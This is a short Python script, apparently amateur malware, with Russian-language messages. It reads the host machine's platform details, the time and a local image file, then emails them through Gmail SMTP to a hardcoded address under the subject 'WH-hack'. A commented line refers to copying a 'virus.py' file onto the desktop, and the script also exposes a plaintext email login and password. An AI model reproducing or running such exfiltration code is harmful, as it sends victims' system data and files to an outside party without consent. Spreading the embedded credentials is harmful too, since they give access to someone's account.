import os, shutil, sys
import smtplib, datetime, platform
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

now = datetime.datetime.now()
log = 'eson3800@gmail.com'
send = 'eson3800@gmail.com'

msg = MIMEMultipart()
msg['Subject'] = 'WH-hack'
msg['From'] = log
msg['To'] = send
text = MIMEText('Платформа: '+platform.platform() +'\n'+'Время: '+now.strftime("%d-%m-%Y %H:%M:%S"))

img_data = open('bob.jpg', 'rb').read()
image = MIMEImage(img_data, name='photo')
msg.attach(text)
msg.attach(image)

s = smtplib.SMTP("smtp.gmail.com", 587)
s.ehlo()
s.starttls()
s.ehlo()
s.login("eson3800@gmail.com","ERIK123454321")
s.sendmail(log, send, msg.as_string())
s.quit()



'''log = 'eson3800@gmail.com'
pas = 'ERIK123454321'
msg = input('Text: ')
see = msg.encode('utf-8')
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(log, pas)
server.sendmail('eson3800@gmail.com', 'eson3800@gmail.com', see)
server.quit()
print('Успешно!')




log = 'eson3800@gmail.com'
pas = 'ERIK123454321'
send = 'eson3800@gmail.com'
subject = 'Hello! how are you!?'

msg = MIMEMultipart()
msg['From'] = log
msg['To'] = send
msg['Subject'] = subject

body = 'Hi there, sending this email from Python!'
msg.attach(MIMEText(body,'plain'))

filename = 'bob.jpg'
attachment  = open(filename,'rb')

part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(log,pas)


server.sendmail(log,send,text)
print('Успешно!')
server.quit()

'''
#КОПИЯ- shutil.copy("C:\\Users\\User\\Desktop\\demo\\virus.py", "C:\\Users\\User\\Desktop")  